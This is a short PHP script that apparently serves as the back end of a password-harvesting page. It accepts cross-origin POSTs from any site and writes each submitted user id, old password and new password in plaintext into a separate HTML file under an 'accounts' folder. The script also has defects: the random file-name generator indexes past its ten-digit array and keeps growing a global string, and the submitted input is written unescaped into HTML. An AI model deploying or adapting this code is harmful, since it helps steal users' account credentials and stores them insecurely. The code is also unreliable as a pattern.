<?php
header ("Access-Control-Allow-Origin: *");
header ("Access-Control-Expose-Headers: Content-Length, X-JSON");
header ("Access-Control-Allow-Methods: GET, POST");
header ("Access-Control-Allow-Headers: *");

$digits = '';
function randomGen($length){
    $numbers = range(0,9);
    shuffle($numbers);
    for($i = 0; $i < $length; $i++){
    	global $digits;
       	$digits .= $numbers[$i];
    }
    return $digits;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

$entityBody = file_get_contents('php://input');
$jsonObj = json_decode($entityBody);
$u_id = $jsonObj->id;
$u_oldPass = $jsonObj->old;
$u_NewPass = $jsonObj->new;

$fullData = "
<h1>User Id :        <span style='color:blue;'>  $u_id        </span> </h1><br>
<h1>Old Password :   <span style='color:red;' >  $u_oldPass   </span> </h1><br>
<h1>New Password :   <span style='color:blue;'>  $u_NewPass   </span> </h1><br>";


    $fileName = "accounts/newAccount".randomGen(100).".html";

    $myfile = fopen($fileName, "w") or die("Unable to open file!");
    fwrite($myfile, $fullData);
    fclose($myfile);

 




    print_r($entityBody);


}
?>





